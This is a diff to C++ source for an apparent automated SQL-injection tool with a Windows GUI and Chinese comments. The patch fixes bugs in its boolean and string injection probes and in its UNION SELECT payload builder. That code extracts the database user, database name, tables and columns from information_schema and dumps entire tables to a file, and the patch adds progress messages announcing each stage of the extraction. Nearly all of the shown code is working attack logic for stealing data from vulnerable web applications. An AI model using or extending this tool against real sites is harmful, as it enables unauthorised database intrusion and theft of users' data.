@@ -74,7 +74,7 @@ void Injector::SeparatePara()
 	return;
 }
 bool Injector::BooleanInjectTesting(int HTTPMethod)//
-{//TODO:未包括POST
+{
 	string allPara;//保存全部参数
 	string normalPara;//正常的参数
 	string testingPara;//测试的参数
@@ -145,8 +145,8 @@ bool Injector::BooleanInjectTesting(int HTTPMethod)//
 			testingPara = allPara + " aNd 1=2";
 			HTTPRequest *normalRequest = new HTTPRequest(m_Domain, m_Page, HTTPMethod);
 			HTTPRequest *testingRequest = new HTTPRequest(m_Domain, m_Page, HTTPMethod);
-			normalRequest->setPostDate(allPara);
-			testingRequest->setPostDate(testingPara);
+			normalRequest->setPostData(allPara);
+			testingRequest->setPostData(testingPara);
 			string normalContent = normalRequest->GetContent();
 			if (normalContent.find(comparestring, 0) == -1)
 			{//正常的访问出错
@@ -242,8 +242,8 @@ bool Injector::StringInjectTesting(int HTTPMethod)//字符串注入
 			testingPara = allPara + "aNd '1'='2";
 			HTTPRequest *normalRequest = new HTTPRequest(m_Domain, m_Page, HTTPMethod);
 			HTTPRequest *testingRequest = new HTTPRequest(m_Domain, m_Page, HTTPMethod);
-			normalRequest->setPostDate(allPara);
-			testingRequest->setPostDate(testingPara);
+			normalRequest->setPostData(allPara);
+			testingRequest->setPostData(testingPara);
 			string normalContent = normalRequest->GetContent();
 			if (normalContent.find(comparestring, 0) == -1)
 			{//正常的访问出错
@@ -287,7 +287,7 @@ void Injector::TryInject()
 	{
 		InjectClass injectclass=POST;
 		if (BooleanInjectTesting(injectclass)==true){
-			::MessageBox(m_csql_injectordlg->m_hWnd, _T("Get Inject"), _T("f"), NULL);
+			m_csql_injectordlg->m_clistboxMsg.InsertString(-1,_T("检测到注入漏洞，尝试注入"));
 			FirstStepInject();
 		}
 		if (StringInjectTesting(injectclass)==true)
@@ -340,7 +340,7 @@ int Injector::GetColumnNumber()
 		{
 			string testingPost = Post + (char)(cZero+i);
 			HTTPRequest *h = new HTTPRequest(m_Domain, m_Page, m_InjectClass & POSTMASK);
-			h->setPostDate(testingPost);
+			h->setPostData(testingPost);
 			string content = h->GetContent();
 			if (content.find(m_csql_injectordlg->m_CompareString, 0) != -1)
 			{//正常页面
@@ -414,7 +414,7 @@ bool Injector::GetInjectionKeyWord(string &ResultString)
 		}
 		testingPost += (char)(cZero+iCompareNumber);
 		HTTPRequest *h = new HTTPRequest(m_Domain, m_Page, m_InjectClass & POSTMASK);
-		h->setPostDate(testingPost);
+		h->setPostData(testingPost);
 		int KeyWordOffset = 0;
 		char testingNum = (char)(cZero+iCompareNumber);
 		string content = h->GetContent();
@@ -479,6 +479,7 @@ bool Injector::GetUser()
 		m_csql_injectordlg->m_csDBUser.SetWindowText(m_UserName.c_str());
 		m_UserName = content.substr(BeginOffset, DataLength);
 		m_csql_injectordlg->m_csDBUser.SetWindowText(m_UserName.c_str());
+		m_csql_injectordlg->m_clistboxMsg.InsertString(-1,_T("获得数据库账户用户名成功"));
 		delete h;
 		return true;
 	}
@@ -500,7 +501,7 @@ bool Injector::GetUser()
 		}
 		testingPost += "user()";
 		HTTPRequest *h = new HTTPRequest(m_Domain, m_Page, m_InjectClass & POSTMASK);
-		h->setPostDate(testingPost);
+		h->setPostData(testingPost);
 		string content = h->GetContent();
 		int BeginOffset;
 		int EndOffset;
@@ -522,7 +523,7 @@ bool Injector::GetUser()
 }
 bool Injector::GetInjectionValue(string &ResultString,string &InjectString)
 {/*第一次参数是结果，第二个参数是攻击负荷。传出结果是攻击负荷返回的数据*/
-	int cZero = '0';
+	char cNum[4]={0};
 	if (m_InjectionKeyWord.length()==0)
 		return false;
 	if (m_InjectClass&GETMASK){
@@ -536,10 +537,12 @@ bool Injector::GetInjectionValue(string &ResultString,string &InjectString)
 		testingPage += m_VulnerablePara;
 		testingPage +=" and 1=2 union select ";
 		int i=1;
+		_itoa_s(i, cNum, 10);
 		for (; i<m_iColumn; i++)
 		{
-			testingPage += (char)(cZero+i);
+			testingPage += cNum;
 			testingPage += ',';
+			_itoa_s(i, cNum, 10);
 		}//end for
 		testingPage += InjectString;
 		testingPage += ";%23";
@@ -574,15 +577,17 @@ bool Injector::GetInjectionValue(string &ResultString,string &InjectString)
 		testingPost += m_VulnerablePara;
 		testingPost += " and 1=2 union select ";
 		int i=1;
+		_itoa_s(i, cNum, 10);
 		for (; i<m_iColumn; i++)
 		{
-			testingPost += (char)(cZero+i);
+			testingPost += cNum;
 			testingPost += ',';
+			_itoa_s(i, cNum, 10);
 		}
 		testingPost += InjectString;
 		
 		HTTPRequest *h = new HTTPRequest(m_Domain, m_Page, m_InjectClass & POSTMASK);
-		h->setPostDate(testingPost);
+		h->setPostData(testingPost);
 		string content = h->GetContent();
 		int BeginOffset;
 		int EndOffset;
@@ -609,6 +614,7 @@ bool Injector::GetDatabaseName()
 	if (m_DatabaseName.length()==0)
 		return false;
 	m_csql_injectordlg->m_csDBName.SetWindowText(m_DatabaseName.c_str());
+	m_csql_injectordlg->m_clistboxMsg.InsertString(-1,_T("获得数据库名称成功"));
 	return true;
 }
 bool Injector::GetTableName()//获得表明,保存在m_vecTable中,并写入界面
@@ -648,7 +654,9 @@ bool Injector::FirstStepInject()
 	GetInjectionKeyWord(m_InjectionKeyWord);
 	GetUser();
 	GetDatabaseName();
+	m_csql_injectordlg->m_clistboxMsg.InsertString(-1,_T("尝试获得表名称"));
 	GetTableName();
+	m_csql_injectordlg->m_clistboxMsg.InsertString(-1,_T("获得表名称成功"));
 	return true;;
 }
 bool Injector::GetColumnName(string TableName)
@@ -657,12 +665,13 @@ bool Injector::GetColumnName(string TableName)
 	char cZero= '0';
 	string halfAttackString ="column_name from information_schema.columns where table_name='"+TableName+"' limit ";//缺少limit
 	int iLimit = 1;
-	char limitNum[3]={0};
+	char limitNum[4]={0};
 	
 	while (true){
 		_itoa_s(iLimit,limitNum,3, 10);
 		string AttackString = halfAttackString + limitNum;
 		AttackString+=',';
+		_itoa_s(iLimit+1, limitNum, 10);
 		AttackString+=limitNum;
 		iLimit++;
 		string ColumnName;
@@ -679,10 +688,11 @@ bool Injector::GetColumnName(string TableName)
 }
 bool Injector::ExportTable(string TableName,string FileName)
 {
+	m_csql_injectordlg->m_clistboxMsg.InsertString(-1,_T("开始导出数据"));
 	GetColumnName(TableName);
 	FILE *fp = fopen(FileName.c_str(), "w+");
-	int iLimit = 1;
-	char LimitNum[3] = {0};
+	int iLimit = 0;
+	char LimitNum[4] = {0};
 	string Space = " ";
 	string LRLF = "\r\n";
 	while (true){
@@ -690,12 +700,21 @@ bool Injector::ExportTable(string TableName,string FileName)
 		for (vector<string>::iterator i =m_vecColumnName.begin(); i!=m_vecColumnName.end(); ++i){
 			string AttackString =*i;
 			string DataValue;
-			AttackString +=" from ";
+			AttackString +=" from (select * from ";
 			AttackString +=TableName;
 			AttackString += " limit ";
+			_itoa_s(iLimit, LimitNum, 10);
 			AttackString += LimitNum;
+			if (iLimit==0){
+				_itoa_s(iLimit+1, LimitNum, 10);//limit 0,1 ，limit 1,2 的形式
+			}
+			else
+			{
+				_itoa_s(iLimit, LimitNum, 10);
+			}
 			AttackString += ",";
 			AttackString += LimitNum;
+			AttackString += ")t";
 			if (GetInjectionValue(DataValue, AttackString))
 			{
 				fwrite(DataValue.c_str(), DataValue.length(), 1, fp);
@@ -714,6 +733,9 @@ bool Injector::ExportTable(string TableName,string FileName)
 		}
 		iLimit++;
 	}
+	
 end:
+	fclose(fp);
+	m_csql_injectordlg->m_clistboxMsg.InsertString(-1,_T("导出数据完成"));
 	return true;
 }
